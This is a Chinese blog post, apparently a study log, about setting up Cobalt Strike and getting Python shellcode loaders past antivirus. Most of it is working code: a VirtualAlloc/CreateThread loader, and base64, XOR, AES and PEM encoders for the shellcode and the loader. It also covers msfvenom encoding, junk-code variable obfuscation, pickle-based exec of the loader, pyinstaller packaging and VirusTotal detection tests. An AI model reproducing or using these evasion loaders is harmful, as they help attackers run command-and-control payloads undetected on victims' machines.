---
layout: post
title: Shellcode编写及CS配置
date: 2023-11-20 15:27 +0800
categories:
- Web_security
tags:
- CS
- 免杀
---

## 环境搭建

首先讲讲搭建环境吧，这次使用了3种不同的CS：

1. 是之前红队留下来的，shellcode用来写马总是运行后自动退出，也不知道是什么原因
2. 在知识星球上找到的CS4.7原版，使用倒没什么问题。
3. 在知识星球上找到的菊花哥魔改版，不会用ORZ

另一个方面是CS的部署，往往需要在Linux的主机上安装java1.8 的环境，导航[放在这里](https://blog.csdn.net/qq_34965596/article/details/117049617)。然后开启主机的防火墙firewall服务，打开对应的端口



## 免杀

接下来开始学习免杀相关的内容，先学习了最基础的 loader 思路：

loader 加载分为3步：
1. 申请内存
2. shellcode 写入内存
3. 执行该内存


```python
shellcode = b'\xfx\xxx'
# 设置VirtualAlloc返回类型为ctypes.c_uint64
#在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表 MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )

# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中

buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

# 创建一个线程从shellcode放置位置首地址开始执行

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
)

# 等待上面创建的线程运行完

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

### shellcode 免杀向：

1. 渐进式加载： 

   其实就是在申请内存和写入内存这两步中做手脚，即在上面 `ptr` <u>内存变量申请时仅设置为可读</u> ，`ctypes.c_int(0x04)`代表可读，在写入内存后，又将 `ptr`的属性更改为可读可写。

   ```python
   # 与基础版对比：
   # 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
   ptr = ctypes.windll.kernel32.VirtualAlloc(
       ctypes.c_int(0),  # 要分配的内存区域的地址
       ctypes.c_int(len(shellcode)),  # 分配的大小
       ctypes.c_int(0x3000),  # 分配的类型
       ctypes.c_int(0x04)  #    该内存的初始保护属性，0x04代表可读
   )
   # 调用kernel32.dll动态链接库中的RTlMoveMemory 函数将shellcode 移动到可以申请的内存中
   buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
   
   ctypes.windll.kernel32.RtlMoveMemory(
       ctypes.c_uint64(ptr),
       buffered,
       ctypes.c_int(len(shellcode))
   )
   # 更改内存的属性为可执行
   ctypes.windll.kernel32.VirtualProtect(ptr, len(shellcode), 0x40, ctypes.byref(ctypes.c_long(1)))
   ```

   

2. base64 加密方式：

   通过base64加密shellcode，在loader上多一步解密。

   ```python
   # shellcode_base64_encode.py
   
   import base64
   buff1 = b"\xx\xx"
   
   b64shellcode = base64.b64encode(buff1).decode('ascii')  # 获取纯字符串
   ```

   ```python
   # loader_base64.py
   
   # ctypes是python的外部函数库，提供了与C语言兼容的数据类型，并允许调用DLL
   import base64
   import ctypes
   
   shellcode = base64.b64decode(b'xx\xx\xxx\x')
   
   shellcode = bytearray(shellcode)
   
   ptr = xxxx
   						-----(重复部分)-----
   ```

3. XOR 异或加密：

   ps.异或加密是简单高效的方法吗？这里使用CS生成raw格式的shellcode，对其中的字节一个个做异或：

   ```python
   # shellcode_xor_encode.py
   
   from optparse import OptionParser
   import sys
   
   
   def xorEncode(file, key, output):
       shellcode = ""
       shellcode_size = 0
       while True:
           code = file.read(1)  # 读取每一个字符
           if not code:
               break  # 如果读空则跳出循环
           code = ord(code) ^ key  # 将字符转换为Unicode编码（整数），再跟Key进行异或
           code_hex = hex(code)  # 对整数转换为十六进制字符串
           code_hex = code_hex.replace("0x", '')  # 替换掉字符串前面的0x
           if len(code_hex) == 1:
               code_hex = '0' + code_hex  # 1 ==> 01
           shellcode += '\\x' + code_hex
           shellcode_size += 1
       file.close()
       output.write(shellcode)
       output.close()
       print(f"shellcodeSize:{shellcode_size}")
   
   
   if __name__ == "__main__":
       usage = "usage: %prog [-f] input_filename [-k] key [-o] output_filename"  # 定义了程序的使用方法
       parser = OptionParser(usage=usage)  # 创建了一个命令行参数解析器
       parser.add_option("-f", "--file", help="input raw shellcode file", type="string", dest="file")
       parser.add_option("-k", "--key", help="xor key", type="int", dest="key", default=12)
       parser.add_option("-o", "--output", help="output x16 shellcode file", type="string", dest="output")
   
       if len(sys.argv) < 4:  # 如果命令行参数数量少于4个，则打印帮助信息并退出程序
           parser.print_help()
           exit()
   
       (options, params) = parser.parse_args()  # 解析命令行参数
       with open(options.file, 'rb') as file:  # 以二进制格式打开输入文件
           with open(options.output, 'w+') as output:
               xorEncode(file, options.key, output)
   
   ```

   ```python
   # loader_xor.py
   
   import ctypes
   
   xor_shellcode = "xxxe\eexe"
   
   #xor key
   key = 12
   
   shellcode = bytearray([ord(xor_shellcode[i]) ^ key for i in range(len(xor_shellcode))])
   -------------------------------------------重复----------------------------------------------
   ```

4. AES加密：

   通过`PyCryptodome`库实现，它可以实现各种方式的加解密。这里使用了AES的CBC模式：

   ```python
   # shellcode_aes_encode.py
   
   from base64 import b64encode
   from Crypto.Cipher import AES
   from Crypto.Util.Padding import pad
   from Crypto.Random import get_random_bytes
   
   shellcode = b"\xfc\x48\x83\xe4\xf0\"
   
   key = get_random_bytes(16)  # 生成一个16位的随机密钥
   cipher = AES.new(key, AES.MODE_CBC)     #创建一个AES加密对象，使用CBC模式和上面生成的密钥
   ct_bytes = cipher.encrypt(pad(shellcode, AES.block_size))   # 使用pad函数对shellcode进行填充，再使用cipher对象对填充后的数据进行加密
   iv = b64encode(cipher.iv).decode('utf-8')   # 将加密对象的初始化向量iv进行base64编码，再解码为utf-8
   ct = b64encode(ct_bytes).decode('utf-8')    # 将加密后的数据进行base64编码，再解码为utf-8
   
   print('iv: \n{}\n key: \n {} \n ase_shellcode:\n {} \n'.format(iv, key, ct))
   ```

   ```python
   # loader_aes.py
   
   import ctypes
   from base64 import b64decode
   from Crypto.Cipher import AES
   from Crypto.Util.Padding import unpad
   
   iv = 'FOy2g'
   key = b'\x1b'
   aes_shellcode = ' BajxL6aqq/Wchy '
   
   iv = b64decode(iv)
   aes_shellcode = b64decode(aes_shellcode)
   cipher = AES.new(key, AES.MODE_CBC, iv)
   
   shellcode = bytearray(unpad(cipher.decrypt(aes_shellcode), AES.block_size))  # unpad()函数用来移除数据块的填充，以便恢复并使用原始数据
   -----------------------------------------------重复---------------------------------------------------
   ```

5. PEM加密：

   也同样使用了`PyCryptodome`库进行加密解密：

   ```python
   # shellcode_pem_encode.py
   from Crypto.IO import PEM
   
   buf = b"\xfc\x48\x83\xe4\xf0\xe8\xc"
   
   # - buf：这是要编码的数据。
   # - marker="shellcode"：这是一个标记，用于在编码的结果中标识数据。
   # - passphrase=None：这是一个可选参数，用于加密 PEM 结果。在这里，它被设置为 None，表示不使用密码。
   # - randfunc=None：这是一个可选参数，用于生成随机数。在这里，它被设置为 None，表示使用默认的随机数生成函数。
   buf = PEM.encode(buf, marker="shellcode", passphrase=None, randfunc=None)
   
   print(buf)
   ```

   ```python
   # loader_pem.py
   
   import ctypes
   from Crypto.IO import PEM
   
   buf = """-----BEGIN shellcode-----
   /EiD5PDoyAAAAEF
   -----END shellcode-----
   """
   
   shellcode = bytearray(PEM.decode(buf, passphrase=None)[0])
   -----------------------------------------------重复-------------------------------------------------
   ```

6. Msfvenom 编码：

   ```
   // -f 指定输出格式，可以生成任意格式的shellcode 。 
   //源文件（cat 的shellcode) 可以是二进制或16进制的shellcode(cs生成raw/c/py)
   
   cat payload.bin |msfvenom -e x64/xor -o test.bin -a x64 --platform windows 
   //生成的test.bin 是二进制shellcode，可以再转成16进制用C或python写加载器加载
   
   cat shellcode.txt |msfvenom -e x64/xor -o xor_shellcode.py -a x64 --platform windows -f python
   //shellcode.txt 是16进制shellcode，
   
   //-e 编码方式(x86/shikata_ga_nai)    
   //-i 编码次数
   //-b 在生成的程序中避免出现的值 ( 过滤坏字符 '\x00，\xff') 
   ```

   ![image-20230817010828819](/images/复盘.assets/image-20230817010828819.png)

7. 使用**veil** 进行免杀：

   *在这一部分，由于在虚拟机中下载了很多次都没有成功，暂时搁置*

### loader免杀向：

1. 随机变量生成器：

   将一些变量名成替换成了随机数，并在代码中间插入随机无效代码作混淆。

   ```python
   # random_variable.py
   
   # coding = utf-8
   import random
   import string
   
   # 随机变量生成器：
   # 将一些变量名称替换成了随机数，并在代码中间插入随机无效代码
   class AutoRandom:
       def auto_random_int(self, max_int=999, min_int=0):  # 生成一个目标范围内的随机数
           return random.randint(min_int, max_int)
   
       def auto_random_str(self, min_length=8, max_length=15):
           length = random.randint(min_length, max_length)  # 生成一个随机长度的字符串
           return ''.join(random.choice(string.ascii_letters) for x in range(length))  # 生成的字符串由随机选择的ASCIL字母组成
   
       def auto_random_void_command(self, min_str=500, max_str=1000, min_int=1, max_ini=9):
           void_command = [
               'var1 = var2 +var3'.replace('var1', self.auto_random_str(min_str, max_str)).replace('var2',
                                                                                                   str(self.auto_random_int(
                                                                                                       99999))).replace(
                   'var3', str(self.auto_random_int(99999))),
               'var1 = var2 - var3'.replace('var1', self.auto_random_str(min_str, max_str)).replace('var2',
                                                                                                    str(self.auto_random_int(
                                                                                                        99999))).replace(
                   'var3', str(self.auto_random_int(99999))),
               'var1 = var2 * var3'.replace('var1', self.auto_random_str(min_str, max_str)).replace('var2',
                                                                                                    str(self.auto_random_int(
                                                                                                        99999))).replace(
                   'var3', str(self.auto_random_int(99999))),
               'var1 = var2 * var3'.replace('var1', self.auto_random_str(min_str, max_str)).replace('var2',
                                                                                                    str(self.auto_random_int(
                                                                                                        99999))).replace(
                   'var3', str(self.auto_random_int(99999))),
               'var1 = var2 / var3'.replace('var1', self.auto_random_str(min_str, max_str)).replace('var2',
                                                                                                    str(self.auto_random_int(
                                                                                                        99999))).replace(
                   'var3', str(self.auto_random_int(99999))),
               'var1 = "var2" + "var3"'.replace('var1', self.auto_random_str(min_str, max_str)).replace('var2',
                                                                                                        self.auto_random_str(
                                                                                                            min_str,
                                                                                                            max_str)).replace(
                   'var3', self.auto_random_str(min_str, max_str)),
               'print("var1")'.replace('var1', self.auto_random_str(min_str, max_str))
           ]
           return void_command[self.auto_random_int(len(void_command) - 1)]
   
   def make_variable_random(shellcodeloader):
       shellcodeloader = shellcodeloader.replace("ctypes", AutoRandom.auto_random_str(min_length=8, max_length=15))
       shellcodeloader = shellcodeloader.replace("shellcode", AutoRandom.auto_random_str(min_length=8, max_length=15))
       shellcodeloader = shellcodeloader.replace("ptr", AutoRandom.auto_random_str(min_length=8, max_length=15))
       shellcodeloader = shellcodeloader.replace("buffered", AutoRandom.auto_random_str(min_length=8, max_length=15))
       shellcodeloader = shellcodeloader.replace("handle", AutoRandom.auto_random_str(min_length=8, max_length=15))
       return shellcodeloader
   
   def make_command_random(shellcodeloader):
       shellcodeloader = shellcodeloader.replace("command1", AutoRandom.auto_random_void_command())
       shellcodeloader = shellcodeloader.replace("command2", AutoRandom.auto_random_void_command())
       shellcodeloader = shellcodeloader.replace("command3", AutoRandom.auto_random_void_command())
       shellcodeloader = shellcodeloader.replace("command4", AutoRandom.auto_random_void_command())
       shellcodeloader = shellcodeloader.replace("command5", AutoRandom.auto_random_void_command())
       shellcodeloader = shellcodeloader.replace("command6", AutoRandom.auto_random_void_command())
       shellcodeloader = shellcodeloader.replace("command7", AutoRandom.auto_random_void_command())
       return shellcodeloader
   
   if __name__ == '__main__':
       AutoRandom = AutoRandom()
       # 正常shellcode 编码
       shellcodeloader = '''
   ---------------------------(需添加标志位)-----------------------------------
       '''
       shellcodeloader = make_variable_random(shellcodeloader)
       shellcodeloader = make_command_random(shellcodeloader)
   
       print(shellcodeloader)
   
   ```

   首先在shellcode代码中插入标志位command，并放入上面的shellcodeloader：

   ```python
   # 添加混淆参数
   
   shellcode = bytearray(b"")
   command3
   # 设置为64位的系统运行环境
   ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
   
   # 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
   ptr = ctypes.windll.kernel32.VirtualAlloc(
       ctypes.c_int(0),  # 要分配的内存区域的地址
       ctypes.c_int(len(shellcode)),  # 分配的大小
       ctypes.c_int(0x3000),  # 分配的类型
       ctypes.c_int(0x40)  # 该内存的初始保护属性，0x40表示可读可写可执行
   )
   # 调用kernel32.dll动态链接库中的RTlMoveMemory 函数将shellcode 移动到可以申请的内存中
   buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
   ctypes.windll.kernel32.RtlMoveMemory(
       ctypes.c_uint64(ptr),
       buffered,
       ctypes.c_int(len(shellcode))
   )
   command4
   # 更改内存的属性为可执行
   # ctypes.windll.kernel32.VirtualProtect(ptr, len(shellcode), 0x40, ctypes.byref(ctypes.c_long(1)))
   
   command5
   # 创建一个线程从shellcode放置位置首地址开始执行
   handle = ctypes.windll.kernel32.CreateThread(
       ctypes.c_int(0),  # 指向安全属性的指针
       ctypes.c_int(0),  # 初始堆栈大小
       ctypes.c_uint64(ptr),  # 指向起始地址的指针
       ctypes.c_int(0),  # 指向任何参数的指针
       ctypes.c_int(0),  # 创建标志
       ctypes.pointer(ctypes.c_int(0))  # 指向接收线程标识符的值的指针
   )
   command6
   # 等待上面创建的线程运行完
   ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
   command7
   
   ```

   

   <blockquote alt="danger"><p>在这里有一个疑惑点：为什么我直接将shellcode放进去，它会执行？（能看到服务器IP）</p></blockquote>

   ![image-20230901150004000](/images/复盘.assets/image-20230901150004000.png)

   随后执行 `random_variable.py`，复制运行结果如下所示，并根据生成的随机数，给`ctypes`库起个别名：

   ```python
   import ctypes as IWxPydJj
   
   vTkrBvJSlY = bytearray(b"")
   vyZZdARltRkByJbxmhEDaRuAYkvbUujbvWLdjfdzDFOkAEsZKEJnxwrwFwMapSrNrwqNtvzbDhFVuTibSNyNFpUbosnXEvHdOImhbiKYpiMmYjGPTpyzgtHJXvNZWfXkMtLAEUcwXhwgWRbfAgeomvKUgCEiagHWxRWStcoSFVJSuUqtuFueRbvQZBEhAlXckLXgdIukoNMwhQqIOYbKtrGQRIpitPQDeUdqUUAEmHnfRoSXjpJUJdZkvvKBdqaLtOlJVCFlnDIQMnjsiuOZfNhoHmmMXUtZoJPBQkfMMgnYGaoAwuVcXbKplbyrkwSAbVolluCzydBtBHGKRvEwIHUIIUUfScUkygWVPXGYwrwdPHbscWoSocyHPRXqjIOHWoTfLGCdnYvQjvasLgcLkTwgjSmrwuFsPXvMbdOmQvuziZRSrgeAOuNRDeowzjpvhfJrUyEtwlRJUOkJXITMeyDZBhHwkiOPAXoIUuMywHpjsNefCfrrvZdRnSOGvLxKFcwxAlBjqQnFmAQmiJzfYnQrfgmKUstdXyqnldmygYxsiAeIfAxspjnizgqmMgFPmrTkAFaGqksVsuxibzBsdPYReMnkTFUQhrOSoJgdGNWYUJAHNeuHQvsqptdAjbAQLvCJmrhplXEtRGkNwTEqSTzQAwdXQsJbqXXJWGrvaNlrQKVBAulBigWTEojifXeutPGdTsZZMdFkaqLdBLZdUjkxLfArLmstyBuoPDEUymGSXFREDahLA = 1014 - 68810
   IWxPydJj.windll.kernel32.VirtualAlloc.restype = IWxPydJj.c_uint64
   
   UgSusHVMspDEbyh = IWxPydJj.windll.kernel32.VirtualAlloc(
       IWxPydJj.c_int(0),
       IWxPydJj.c_int(len(vTkrBvJSlY)),
       IWxPydJj.c_int(0x3000),
       IWxPydJj.c_int(0x40)
   )
   rRirjBsJWVkkq = (IWxPydJj.c_char * len(vTkrBvJSlY)).from_buffer(vTkrBvJSlY)
   IWxPydJj.windll.kernel32.RtlMoveMemory(
       IWxPydJj.c_uint64(UgSusHVMspDEbyh),
       rRirjBsJWVkkq,
       IWxPydJj.c_int(len(vTkrBvJSlY))
   )
   xpTVWPHLqLfuPAHUbniOodlkVSLNmZBucZrHiyCEjQJRzgcWzlGuwcbxEUxMQRzAaMFxeGOIQgDhUHEeBpwXciyTzrGvDbCADeidIXsammvfWuVKDpjQtGByGsyBfOXtndAuXiHtUeNVvMtbVRwxxRgdRRGzDylhxfVOvkqgpCksXTTXVAgROfGxJQJHwACTjGSZgdbuCghrVFDvuhKYLwANhJkWhZQEWAETYZkiERECXGRqyACjKGPtJmzLFStPPBNzgxvKIVSbXxqDiGCiCqcJbKLzaAIiZGdAPIjIBGkqsnFbXcCzwrWxngplpiliWYJktRHWuAMgYrUmzDqBkUqgKrItnnjNyiUDbpHLDJnRTElbGLxwTWXjVpeeoXUNbHXJRlibDeNhiHNrgvabGcolikreJAwlYonJqmFBuAvFDRxYaBwTFDlQHxQXQgJtqilYFZJKIAOjIyEgeAWkrLErjAwdvbYKcFZIzLZOglOCcCdLYkiTZbOHjSbbklGXOwzmkwdAcHnEagrTqRSQqNUsYBGYLEjVrXTJtFpspKgULCwXLRjcJIEDxPOZiWuChffKSiRMpecaRdNHSNwJajWQCjWDkOhPQpkEZqzYEWyWVuHkWvTxpmtrYOqUTvPcKiQisNutHCEUdRHEXBdWXEWmiLRZmvyEwdKqAWfKLftrgvJOjDeGhsgtIMqDuqbYDgZwbqLiGhMNAfqpAsWsDGfsZiqRKeLryQBpRjPwEQXNIagbjUSxKAsmhikiBQKnVPzcWFxDHIFJfLUsuEYesYxLLuQETlbGMKNynEeJCdGSDhAKPNWnPLHdzmCDwkOTbPVrWBdjJFfRvCOHjsLpmeOcnNFyRkRWckqMDzDvIdOAtdtYNWobwiDEYFuThTvYFIGzTJZSRDVQAZRWNzgCF = 52390 +81695
   nckpDCmp = IWxPydJj.windll.kernel32.CreateThread(
       IWxPydJj.c_int(0),
       IWxPydJj.c_int(0),
       IWxPydJj.c_uint64(UgSusHVMspDEbyh),
       IWxPydJj.c_int(0),
       IWxPydJj.c_int(0),
       IWxPydJj.pointer(IWxPydJj.c_int(0))
   )
   XHYRjZAzNTKKGAHVrpEekcliDbrAujFrPVqIQmAiBWckaaRXWqfzyNasRsCgxapQDbbDajownXIeiNXRkcHrJVeEvGUyOvokXrEKMicOPWQheSnGPNNrBrLnUgSwXfVwefdbkcbFUjVqUwAUeqIMEDvJZMTkflPtsxljXcJPmMEPEOmwIMRwMcwgsmClmVgnVrZrIYEBItBYDwMvdnKEgQRdOYJYbCKoOelnsPaCbJOrQktFyWVZBXxVYTbNbIyhjzJqZfVdUIUKVCEaWIYUZNzXVXjHDOwktWsAQKRXYrqsKZNKnhToEYkZbioTmSawMrUNXltreiQzySFPgjHvqaZmunkukgktfUmEzYQYRwElxcOTGydpdaHrfMmtpoWHJEBXEIDIQMmzFyxeHKsWQIQXVHXjMBZIMcjktZlOzqSgiHbgrQZkCNBuQYOtOtFVfYUXUWhXafgstdOpkrwvScFmsNyjcUNhIJExssvvmQHDqjpKQgumEdxXWawSsVNoNenPHYpCPbCtmqkHawwyScQfMYswrRWfAGpiLcDhCPadJAfwQHNUGYebcHlLlpcDwPCxZyKo = 12543 / 51549
   IWxPydJj.windll.kernel32.WaitForSingleObject(IWxPydJj.c_int(nckpDCmp), IWxPydJj.c_int(-1))
   ```

2. 使用base64加密loader：

   shellcode 部分可以使用其他编码

   ```python
   # loader_base64_encode.py
   import base64
   
   # base64_loader = base64.b64encode(b"""xxxxxx""")
   
   base64_loader = base64.b64encode(b"""
   shellcode = bytearray(buf)
   ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
   ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
   buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
   ctypes.windll.kernel32.RtlMoveMemory(
       ctypes.c_uint64(ptr),
       buf,
       ctypes.c_int(len(shellcode))
   )
   handle = ctypes.windll.kernel32.CreateThread(
       ctypes.c_int(0),
       ctypes.c_int(0),
       ctypes.c_uint64(ptr),
       ctypes.c_int(0),
       ctypes.c_int(0),
       ctypes.pointer(ctypes.c_int(0))
   )
   ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
   """)
   
   print(base64_loader)
   
   ```

   ```python
   #loader_base64_decode.py
   import base64
   import ctypes
   
   # 在这里用base64将shellcode 加密
   buf = base64.b64decode(b'/EiD5PDoyAA4yMDIuNDMABfXhAA==')
   
   # loader解码
   base64_loader = base64.b64decode(b'CnNoZWxsY29kZSA9IGJ5dGVhcnJheShidWYpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLCBjdHlwZXMuY19pbnQoMHgzMDAwKSwgY3R5cGVzLmNfaW50KDB4NDApKQpidWYgPSAoY3R5cGVzLmNfY2hhciAqIGxlbihzaGVsbGNvZGUpKS5mcm9tX2J1ZmZlcihzaGVsbGNvZGUpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeSgKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLAogICAgYnVmLAogICAgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKQopCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKAogICAgY3R5cGVzLmNfaW50KDApLAogICAgY3R5cGVzLmNfaW50KDApLAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksCiAgICBjdHlwZXMuY19pbnQoMCksCiAgICBjdHlwZXMuY19pbnQoMCksCiAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpCikKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkpCg==')
   
   # exec 函数是否可以换成其他函数呢？
   
   exec(base64_loader)
   ```

3. 使用PEM加密loader：

   ```python
   # loader_pem_encode.py
   from Crypto.IO import PEM
   
   #pem_loader = b""" xxx """
   
   pem_loader = b"""
   shellcode = bytearray(buf)
   ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
   ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
   buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
   ctypes.windll.kernel32.RtlMoveMemory(
       ctypes.c_uint64(ptr),
       buf,
       ctypes.c_int(len(shellcode))
   )
   handle = ctypes.windll.kernel32.CreateThread(
       ctypes.c_int(0),
       ctypes.c_int(0),
       ctypes.c_uint64(ptr),
       ctypes.c_int(0),
       ctypes.c_int(0),
       ctypes.pointer(ctypes.c_int(0))
   )
   ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
   """
   # 加密
   # passphrase：指定密钥,可以为空 passphrase=None
   # marker：指定名称
   buf = PEM.encode(pem_loader, marker="shellcodeloader", passphrase=b'345', randfunc=None)
   
   print(buf)
   ```

   

   ```python
   
   from Crypto.IO import PEM
   import ctypes
   from base64 import b64decode
   from Crypto.Cipher import AES
   from Crypto.Util.Padding import unpad
   
   buf = base64.b64decode(b'/EiD5PDoyAA4yMDIuNDMABfXhAA==')
   
   # 加密后的loader
   pem_loader = """-----BEGIN shellcodeloader-----
   Proc-Type: 4,ENCRYPTED
   DEK-Info: DES-EDE3-CBC,9A476DEA39B97E71
   
   FlO1ix7c8kES7BRjqmmf7zo4FduUT3sWnCns3MopAUxIgwjL/GUuAohCoo5PUX1Z
   mUspoiSVnKQ+GROWfidzA2rQg/9+ogtb6qWwxBmBUuV5P/c5mQbqSuSGVjRiXsbj
   htS4Y2htZsisbV6M1HCzD/7BKgYt6dx3fg1ufVeUGlXySw1VGDhvvcXZZgjbcMas
   F18tk7SxWgE/QUAw/25HYG/QVPvs/zKDIqpUl860gnRQ1NkUfJ/AoW6wEbw9dsZr
   vXKa1rftRMel2AqaXAMFgA2OAuPMpqyzVbQ+sH/HA5C5gLJooSd2ybZmgVA8NiQS
   9JebDzeoQVc46aG8+Iis05o/slCxnUFdVUowUaUrDX1vHAsMzScANdozDzVT6SzM
   M/6asfaIpgqKiEXwx+z3y9ZeeRVUYY64OVwwNwR/6M1/I02KlMUyd9CJbPvJCBbc
   -----END shellcodeloader-----
   
   """
   
   # 解密
   loader = bytearray(PEM.decode(pem_loader, passphrase=b'345')[0])
   
   exec(loader)
   
   ```

   

   <blockquote alt="danger"><p>当然，这里的exec是不是也可以用其他函数做替换呢？留个深入点吧,</blockquote>

   <!-- ps.其实写到这里，有外出培训、公司业务等事情没有再继续往下写，再次动笔已经是一个星期之后，现在已经没有了刚刚写出代码的成功运行后的愉悦感，所以说及时复盘真的很重要，再动笔 少了很多自己在实践中的细节感触。也还是怪自己平时时间没有权衡好，给自己埋了一个坑点。 -->

4. 使用反序列化处理：

   Python 序列化和反序列化最常用的是`cpickle`和`pickle`, 前者由C语言实现，速度快。在下面我们使用`pickle`来实现，这是一个简单的demo，用来演示功能：

   ```python
   # demo.py
   import os
   import pickle
   
   
   class test(object):
       def __reduce__(self):     # 在对象被反序列化的时候执行
           return (os.system, ('whoami',))
   
   
   a = test()
   payload = pickle.dumps(a)
   print(payload)
   pickle.loads(payload)
   
   
   # 返回：
   # b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
   # administrator\14187
   # \x80:协议头声明    \x04：协议版本
   ```

   `pickle`有下列四种操作方法：

   | 函数  | 说明                           |
   | ----- | ------------------------------ |
   | dump  | 对象序列化到文件对象并存入文件 |
   | dumps | 对象序列化为bytes对象          |
   | load  | 对象反序列化并从文件中读取数据 |
   | loads | 从bytes对象反序列化            |

   

   ```python
   # shellcodeloader_serialize.py
   
   import pickle
   import base64
   
   shellcodeloader = """
   import ctypes,base64,time,codecs
   
   #这里不能直接存在空字节，反序列化的时候会出错，所以要处理一下
   shellcode = base64.b64decode(b'/EiD5PDoy//zE4NS44MC4yMDIuNDMAOt5osQ==')
   shellcode = codecs.escape_decode(shellcode)[0]
   shellcode = bytearray(shellcode)
   
   ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
   
   ptr = ctypes.windll.kernel32.VirtualAlloc(
       ctypes.c_int(0),  
       ctypes.c_int(len(shellcode)),
       ctypes.c_int(0x3000),  
       ctypes.c_int(0x40) 
       )
   
   buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
   ctypes.windll.kernel32.RtlMoveMemory(
       ctypes.c_uint64(ptr),
       buffered,
       ctypes.c_int(len(shellcode))
   )
   
   handle = ctypes.windll.kernel32.CreateThread(
       ctypes.c_int(0),
       ctypes.c_int(0), 
       ctypes.c_uint64(ptr), 
       ctypes.c_int(0), 
       ctypes.c_int(0), 
       ctypes.pointer(ctypes.c_int(0)) 
   )
   
   ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
   """
   
   class AAA(object):
       def __reduce__(self):
           return (exec, (shellcodeloader,))
   
   seri = pickle.dumps(AAA())
   seri_base64 = base64.b64encode(seri)
   print(seri_base64)
   
   ```

   上面生成了序列化的 `seri_base64`,在下一步中进行解密加载shellcode

   ```python
   import base64, pickle
   
   
   shellcodeloader = b'gASVZggAAAAAAACMCGJ1aWx0aW5zlFKULg=='
   pickle.loads(base64.b64decode(shellcodeloader))
   ```

   

## Python 打包成exe

在上面构建了相应的Python文件，但是往往在目标环境中运行还需要存在相应的Python文件才可以运行的，这时就需要将Python打包成EXE文件来解决环境问题。有这些打包程序可供选择：`pyinstaller`或者 `py2exe`, `cx_Freeze`(只用过第一个)

<blockquote alt="warn"><p>对于不同的打包程序来说，免杀性也是不同的</p></blockquote>

### 安装：

使用Python3:`pip3 install pyinstaller -i https://pypi.douban.com/simple`

### 使用：

```python
pyinstaller -F test.py -w -i test.ico  #使用-w参数会增加被杀软检测到的可能性

-F,-onefile: 表示生成单个可执行文件(常用)
-w, -windowed, -noconsole:表示运行时不会出现黑窗控制台;
-p,表示你自己自定义需要加载的类路径, 一般情况下用不到;
-i,表示可执行文件的图标,注意:图片后缀必须是.ico
-c,console,-nowindowed:此为windows系统的默认选项, 使用这个参数, 运行时会有一个黑窗控制台;
-D,-onedir:创建一个目录,包含EXE文件,但会依赖很多文件(默认选项)
```

### 组合测试，绕过杀软：

VT查杀效果：`shellcode_aes + shellcodeloader_pem + pyinstaller +python3`

![image-20230831141456768](/images/复盘.assets/image-20230831141456768-1694486409225-2.png)

<span alt="shadow">那么该如何降低VT的免杀率呢？</span>



## 总结：

